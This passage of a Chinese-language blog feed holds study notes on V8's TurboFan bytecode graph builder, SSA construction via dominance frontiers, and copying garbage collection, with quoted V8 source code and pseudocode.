class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Registers</span></span><br><span class="line">  register_base_ = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(values()-&gt;<span class="built_in">size</span>());</span><br><span class="line">  Node* undefined_constant = builder-&gt;jsgraph()-&gt;UndefinedConstant();</span><br><span class="line">  values()-&gt;insert(values()-&gt;<span class="built_in">end</span>(), register_count, undefined_constant);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">DEFINE_GETTER(UndefinedConstant, HeapConstant(factory()-&gt;undefined_value()))</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">// valuev8::internal::Handle&lt;v8::internal::HeapObject&gt;</span></span><br><span class="line"><span class="function">Node* <span class="title">JSGraph::HeapConstant</span><span class="params">(Handle&lt;HeapObject&gt; value)</span> </span>&#123;</span><br><span class="line">  Node** loc = cache_.FindHeapConstant(value);</span><br><span class="line">  <span class="keyword">if</span> (*loc == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    *loc = graph()-&gt;NewNode(common()-&gt;HeapConstant(value));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *loc;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">const</span> Operator* <span class="title">CommonOperatorBuilder::HeapConstant</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> Handle&lt;HeapObject&gt;&amp; value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;Handle&lt;HeapObject&gt;&gt;(  <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kHeapConstant, Operator::kPure,       <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"HeapConstant"</span>,                                 <span class="comment">// name</span></span><br><span class="line">      <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,                               <span class="comment">// counts</span></span><br><span class="line">      value);                                         <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先从cache中检查是否已经有HeapConstant,如果没有就新建再返回，如果有就直接返回cache里的。</p><p>然后再向value_的最后插入一个undefined_constant节点作为Accumulator。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Accumulator</span></span><br><span class="line">accumulator_base_ = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(values()-&gt;<span class="built_in">size</span>());</span><br><span class="line">values()-&gt;push_back(undefined_constant);</span><br></pre></td></tr></table></figure><p>然后设置Context</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// Context</span></span><br><span class="line">  <span class="keyword">int</span> context_index = Linkage::GetJSCallContextParamIndex(parameter_count);</span><br><span class="line">  <span class="keyword">const</span> Operator* op = common()-&gt;Parameter(context_index, <span class="string">"%context"</span>);</span><br><span class="line">  context_ = builder-&gt;graph()-&gt;NewNode(op, graph()-&gt;start());</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">    <span class="comment">// A special &#123;Parameter&#125; index for JSCalls that represents the context.</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">GetJSCallContextParamIndex</span><span class="params">(<span class="keyword">int</span> parameter_count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> parameter_count + <span class="number">2</span>;  <span class="comment">// Parameter (arity + 2) is special.</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">const</span> Operator* <span class="title">CommonOperatorBuilder::Parameter</span><span class="params">(<span class="keyword">int</span> index,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                 <span class="keyword">const</span> <span class="keyword">char</span>* debug_name)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!debug_name) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (index) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHED_PARAMETER(index) \</span></span><br><span class="line">  <span class="keyword">case</span> index:                   \</span><br><span class="line">    <span class="keyword">return</span> &amp;cache_.kParameter##index##Operator;</span><br><span class="line">      CACHED_PARAMETER_LIST(CACHED_PARAMETER)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> CACHED_PARAMETER</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Uncached.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;ParameterInfo&gt;(  <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kParameter, Operator::kPure,     <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"Parameter"</span>,                               <span class="comment">// name</span></span><br><span class="line">      <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,                          <span class="comment">// counts</span></span><br><span class="line">      ParameterInfo(index, debug_name));         <span class="comment">// parameter info</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>context也创建了一个parameter的node，用来做什么的我还没看懂，可能需要好好看看log或者compiler/linkage.h这个文件</em></p><h4 id="VisitBytecodes"><a href="#VisitBytecodes" class="headerlink" title="VisitBytecodes"></a>VisitBytecodes</h4><p>V8准备一个称为v8::internal::AstVisitor的基类，简称AstVisitor，从AST生成bytecode。<br>AstVisitor是一个使用Vistor模式的类。<br>在深度优先搜索AST时调用相应的回调函数。<br>生成的bytecode存放在bytecode数组当中，用Javascript来模拟这个结构，看起来像这样。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-06-090746.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-06-090832.jpg" alt=""><br>当然这个并不重要，回顾一下而已。</p><p>VisitBytecodes首先进行bytecode_analysis，在这里面进行包括liveness分析等。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BytecodeAnalysis <span class="title">bytecode_analysis</span><span class="params">(bytecode_array(), local_zone(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                   analyze_environment_liveness())</span></span>;</span><br><span class="line">bytecode_analysis.Analyze(osr_offset_);</span><br><span class="line">set_bytecode_analysis(&amp;bytecode_analysis);</span><br><span class="line"></span><br><span class="line"><span class="function">interpreter::BytecodeArrayIterator <span class="title">iterator</span><span class="params">(bytecode_array())</span></span>;</span><br><span class="line">set_bytecode_iterator(&amp;iterator);</span><br><span class="line"><span class="function">SourcePositionTableIterator <span class="title">source_position_iterator</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    handle(bytecode_array()-&gt;SourcePositionTable()))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (analyze_environment_liveness() &amp;&amp; FLAG_trace_environment_liveness) &#123;</span><br><span class="line">  <span class="function">OFStream <span class="title">of</span><span class="params">(<span class="built_in">stdout</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  bytecode_analysis.PrintLivenessTo(of);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想观察liveness过程，可以启用这个flag<br><code>DEFINE_BOOL(trace_environment_liveness, false,            &quot;trace liveness of local variable slots&quot;)</code></p><p>bytecode_array被设置迭代，然后通过VisitSingleBytecode一个个处理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; !iterator.done(); iterator.Advance()) &#123;</span><br><span class="line">  VisitSingleBytecode(&amp;source_position_iterator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数前面就是一些获取bytecode并偏移寻找下一个还有一些其他判断，主要的内容其实是这个大的switch case，对不同bytecode进行不同处理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">switch</span> (iterator.current_bytecode()) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTECODE_CASE(name, ...)       \</span></span><br><span class="line">  <span class="keyword">case</span> interpreter::Bytecode::k#<span class="meta">#name: \</span></span><br><span class="line">    Visit#<span class="meta">#name();                     \</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      BYTECODE_LIST(BYTECODE_CASE)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BYTECODE_CODE</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BYTECODE_LIST在bytecode.h里，太长了就不列了。</p><p>VisitSingleBytecode里有很多分支，我捡一些写一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[generated bytecode for function: foo]</span><br><span class="line">Parameter count 2</span><br><span class="line">Frame size 24</span><br><span class="line">   80 E&gt; 0x186d973a4f8a @    0 : a0                StackCheck</span><br><span class="line">   97 S&gt; 0x186d973a4f8b @    1 : 28 02 00 00       LdaNamedProperty a0, [0], [0]</span><br><span class="line">         0x186d973a4f8f @    5 : 26 fb             Star r0</span><br><span class="line">         0x186d973a4f91 @    7 : 0c 64             LdaSmi [100]</span><br><span class="line">         0x186d973a4f93 @    9 : 26 f9             Star r2</span><br><span class="line">   97 E&gt; 0x186d973a4f95 @   11 : 57 fb 02 f9 02    CallProperty1 r0, a0, r2, [2]</span><br><span class="line">  110 S&gt; 0x186d973a4f9a @   16 : a4                Return</span><br><span class="line">Constant pool (size &#x3D; 1)</span><br><span class="line">0x186d973a4f19: [FixedArray] in OldSpace</span><br><span class="line"> - map: 0x186d90c023c1 &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x186dc2812029 &lt;String[7]: indexOf&gt;</span><br><span class="line">Handler Table (size &#x3D; 0)</span><br></pre></td></tr></table></figure><ul><li>VisitStackCheck<br>在为StackCheck构建node之前，如果没有一个能够支配（effect-dom)它的checkpoint节点，那么会先创建一个精确的checkpoint节点。<br>于是在PrepareEagerCheckpoint调用<code>Node* node = NewNode(common()-&gt;Checkpoint());</code><br>即使我们在某种情况下跳过了checkpoint的创建，依然会染着Effect边为StackCheck寻找一个能够支配（effect-dom)它的Checkpoint。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V(Checkpoint, Operator::kKontrol, 0, 1, 1, 0, 1, 0)</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::VisitStackCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  PrepareEagerCheckpoint();</span><br><span class="line">  Node* node = NewNode(javascript()-&gt;StackCheck());</span><br><span class="line">  environment()-&gt;RecordAfterState(node, Environment::kAttachFrameState);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::PrepareEagerCheckpoint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (needs_eager_checkpoint()) &#123;</span><br><span class="line">    <span class="comment">// Create an explicit checkpoint node for before the operation. This only</span></span><br><span class="line">    <span class="comment">// needs to happen if we aren't effect-dominated by a &#123;Checkpoint&#125; already.</span></span><br><span class="line">    mark_as_needing_eager_checkpoint(<span class="literal">false</span>);</span><br><span class="line">    Node* node = NewNode(common()-&gt;Checkpoint());</span><br><span class="line">    DCHECK_EQ(<span class="number">1</span>, OperatorProperties::GetFrameStateInputCount(node-&gt;op()));</span><br><span class="line">    DCHECK_EQ(IrOpcode::kDead,</span><br><span class="line">              NodeProperties::GetFrameStateInput(node)-&gt;opcode());</span><br><span class="line">    <span class="function">BailoutId <span class="title">bailout_id</span><span class="params">(bytecode_iterator().current_offset())</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> BytecodeLivenessState* liveness_before =</span><br><span class="line">        bytecode_analysis()-&gt;GetInLivenessFor(</span><br><span class="line">            bytecode_iterator().current_offset());</span><br><span class="line"></span><br><span class="line">    Node* frame_state_before = environment()-&gt;Checkpoint(</span><br><span class="line">        bailout_id, OutputFrameStateCombine::Ignore(), liveness_before);</span><br><span class="line">    NodeProperties::ReplaceFrameStateInput(node, frame_state_before);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// In case we skipped checkpoint creation above, we must be able to find an</span></span><br><span class="line">    <span class="comment">// existing checkpoint that effect-dominates the nodes about to be created.</span></span><br><span class="line">    <span class="comment">// Starting a search from the current effect-dependency has to succeed.</span></span><br><span class="line">    Node* effect = environment()-&gt;GetEffectDependency();</span><br><span class="line">    <span class="keyword">while</span> (effect-&gt;opcode() != IrOpcode::kCheckpoint) &#123;</span><br><span class="line">      DCHECK(effect-&gt;op()-&gt;HasProperty(Operator::kNoWrite));</span><br><span class="line">      DCHECK_EQ(<span class="number">1</span>, effect-&gt;op()-&gt;EffectInputCount());</span><br><span class="line">      effect = NodeProperties::GetEffectInput(effect);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li>VisitLdaNamedProperty<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> Operator* <span class="title">JSOperatorBuilder::LoadNamed</span><span class="params">(Handle&lt;Name&gt; name,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             <span class="keyword">const</span> VectorSlotPair&amp; feedback)</span> </span>&#123;</span><br><span class="line">  <span class="function">NamedAccess <span class="title">access</span><span class="params">(LanguageMode::kSloppy, name, feedback)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;NamedAccess&gt;(           <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kJSLoadNamed, Operator::kNoProperties,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"JSLoadNamed"</span>,                                    <span class="comment">// name</span></span><br><span class="line">      <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>,                                 <span class="comment">// counts</span></span><br><span class="line">      access);                                          <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>VisitStar</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildCall</span><span class="params">(ConvertReceiverMode receiver_mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     Node* <span class="keyword">const</span>* args, <span class="keyword">size_t</span> arg_count,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">int</span> slot_id)</span> </span>&#123;</span><br><span class="line">  DCHECK_EQ(interpreter::Bytecodes::GetReceiverMode(</span><br><span class="line">                bytecode_iterator().current_bytecode()),</span><br><span class="line">            receiver_mode);</span><br><span class="line">  PrepareEagerCheckpoint();</span><br><span class="line"></span><br><span class="line">  VectorSlotPair feedback = CreateVectorSlotPair(slot_id);</span><br><span class="line"></span><br><span class="line">  CallFrequency frequency = ComputeCallFrequency(slot_id);</span><br><span class="line">  <span class="keyword">const</span> Operator* op =</span><br><span class="line">      javascript()-&gt;Call(arg_count, frequency, feedback, receiver_mode,</span><br><span class="line">                         GetSpeculationMode(slot_id));</span><br><span class="line">  JSTypeHintLowering::LoweringResult lowering = TryBuildSimplifiedCall(</span><br><span class="line">      op, args, <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(arg_count), feedback.slot());</span><br><span class="line">  <span class="keyword">if</span> (lowering.IsExit()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  Node* node = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (lowering.IsSideEffectFree()) &#123;</span><br><span class="line">    node = lowering.value();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK(!lowering.Changed());</span><br><span class="line">    node = ProcessCallArguments(op, args, <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(arg_count));</span><br><span class="line">  &#125;</span><br><span class="line">  environment()-&gt;BindAccumulator(node, Environment::kAttachFrameState);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">const</span> Operator* <span class="title">JSOperatorBuilder::Call</span><span class="params">(<span class="keyword">size_t</span> arity, CallFrequency frequency,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        VectorSlotPair <span class="keyword">const</span>&amp; feedback,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        ConvertReceiverMode convert_mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        SpeculationMode speculation_mode)</span> </span>&#123;</span><br><span class="line">  DCHECK_IMPLIES(speculation_mode == SpeculationMode::kAllowSpeculation,</span><br><span class="line">                 feedback.IsValid());</span><br><span class="line">  <span class="function">CallParameters <span class="title">parameters</span><span class="params">(arity, frequency, feedback, convert_mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                            speculation_mode)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;CallParameters&gt;(   <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kJSCall, Operator::kNoProperties,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"JSCall"</span>,                                    <span class="comment">// name</span></span><br><span class="line">      parameters.arity(), <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>,           <span class="comment">// inputs/outputs</span></span><br><span class="line">      parameters);                                 <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;总览&quot;&gt;&lt;a href=&quot;#总览&quot; class=&quot;headerlink&quot; title=&quot;总览&quot;&gt;&lt;/a&gt;总览&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span 
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>Building SSA Form</title>
    <link href="http://eternalsakura13.com/2018/09/02/ssa/"/>
    <id>http://eternalsakura13.com/2018/09/02/ssa/</id>
    <published>2018-09-02T11:47:20.854Z</published>
    <updated>2018-10-22T14:25:51.727Z</updated>
    
    <content type="html"><![CDATA[<ol><li>计算Dominator tree<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-02-122833.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-02-122907.jpg" alt=""></li><li>计算控制边界<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for all nodes, n, in the CFG</span><br><span class="line">    DF(n) &lt;- NULL</span><br><span class="line">for all nodes, n, in the CFG</span><br><span class="line">    if n has multiple predecessors then&#x2F;&#x2F;必须有2个或2个以上的predecessors</span><br><span class="line">        for each predecessor p of n</span><br><span class="line">            runner &lt;- p</span><br><span class="line">            while runner !&#x3D; IDom(n)</span><br><span class="line">                DF(runner) &lt;- DF(runner) U &#123;n&#125;</span><br><span class="line">                runner &lt;- IDom(runner)</span><br></pre></td></tr></table></figure>举例如下：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061548.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061607.png" alt=""><br>最后得到Dominance Frontiers<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061622.png" alt=""></li></ol><p><strong>对于n的定义语句可以放置一个PHI函数在m处，如果</strong><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061753.png" alt=""></p><ol start="3"><li>插入PHI函数<br>在真正插入PHI函数之前，我们需要在Dominance Frontiers的基础上，更精确的找到需要PHI函数的地方。</li></ol><p>“The basic idea is simple. A definition of x in block b forces a ϕ-function at every node in df(b).<br>Since that ϕ-function is a new definition of x, it may, in turn, force the insertion of additional ϕ-functions.”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for each name x∈ Globals</span><br><span class="line">    WorkList &lt;- Blocks(x)</span><br><span class="line">    for each block b∈ WorkList</span><br><span class="line">        for each block d in DF(b)</span><br><span class="line">            if d has no PHI function for x then </span><br><span class="line">                insert a PHI function for x in d</span><br><span class="line">                WorkList &lt;- WorkList U &#123;d&#125;</span><br></pre></td></tr></table></figure><p>对于每个global name x，算法将WorkList初始化为Blocks(x)。<br>对于WorkList上的每个block b，算法在b的支配边界(DF(b))中每个block d的起始处插入PHI函数。<br><strong>在向d中添加对应于x的PHI函数之后，算法将d添加到WorkList，以反映d中对x的新赋值操作</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-072211.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-072226.png" alt=""><br>4. 重命名变量的名字，满足SSA规则</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;计算Dominator tree&lt;br&gt;&lt;img src=&quot;https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-02-122833.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;htt
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>v8 GC</title>
    <link href="http://eternalsakura13.com/2018/09/01/v8_GC/"/>
    <id>http://eternalsakura13.com/2018/09/01/v8_GC/</id>
    <published>2018-08-31T16:05:52.331Z</published>
    <updated>2018-10-22T14:25:51.720Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="对象-头-域"><a href="#对象-头-域" class="headerlink" title="对象/头/域"></a>对象/头/域</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071312.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071357.png" alt=""></p><h3 id="mutator"><a href="#mutator" class="headerlink" title="mutator"></a>mutator</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071247.png" alt=""></p><h3 id="根-root"><a href="#根-root" class="headerlink" title="根(root)"></a>根(root)</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-01-071052.png" alt=""></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="Cheney的GC复制算法"><a href="#Cheney的GC复制算法" class="headerlink" title="Cheney的GC复制算法"></a>Cheney的GC复制算法</h3><p>Cheney的GC复制算法不是递归地，而是迭代地进行复制。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">copying()&#123;</span><br><span class="line">    scan = $<span class="built_in">free</span> = $to_start </span><br><span class="line">    <span class="keyword">for</span>(r : $roots)</span><br><span class="line">        *r = copy(*r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(scan != $<span class="built_in">free</span>) </span><br><span class="line">        <span class="keyword">for</span>(child : children(scan))</span><br><span class="line">            *child = copy(*child) </span><br><span class="line">        scan += scan.<span class="built_in">size</span></span><br><span class="line">    </span><br><span class="line">    swap($from_start, $to_start) &#125;</span><br></pre></td></tr></table></figure><p>在第2行将scan和<code>$free</code>的两个指针初始化。scan 是用于搜索复制完成的对象的指针。<code>$free</code>是指向分块开头的指针。<br>首先复制的是直接从根引用的对象，用到的是第3行和第4行。<br>在第6行到第9行搜索复制完成的对象，迭代复制其子对象。最后把From空间和 To空间互换就结束了。Cheney的GC复制算法中的关键点仍是copy()函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">copy(obj)&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_pointer_to_heap(obj.forwarding, $to_start) == FALSE)</span><br><span class="line">        copy_data($<span class="built_in">free</span>, obj, 